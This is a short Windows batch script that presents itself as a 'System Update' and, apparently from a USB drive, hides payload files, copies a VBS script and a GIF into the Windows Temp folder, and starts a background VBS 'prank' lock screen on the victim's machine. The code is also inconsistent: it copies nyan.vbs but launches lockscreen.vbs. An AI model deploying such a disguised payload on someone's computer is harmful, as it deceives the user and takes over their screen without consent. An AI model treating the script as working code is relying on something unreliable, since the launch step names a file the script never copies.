@echo off
title Deploying System Update
color 4F
cls
echo [!] Deploying Lock Screen...
timeout /t 2 /nobreak >nul

:: Hide and copy necessary files from USB to the system
attrib +h +s "E:\payload\nyan.vbs" 2>nul
attrib +h +s "E:\payload\nyan_glitch.gif" 2>nul
copy "E:\payload\nyan.vbs" "C:\Windows\Temp\nyan.vbs" /Y >nul
copy "E:\payload\nyan_glitch.gif" "C:\Windows\Temp\nyan_glitch.gif" /Y >nul

:: Start the prank script
start /B wscript.exe C:\Windows\Temp\lockscreen.vbs

:: Wait for user to restart the machine
echo Please restart the computer to end the prank...
pause
exit
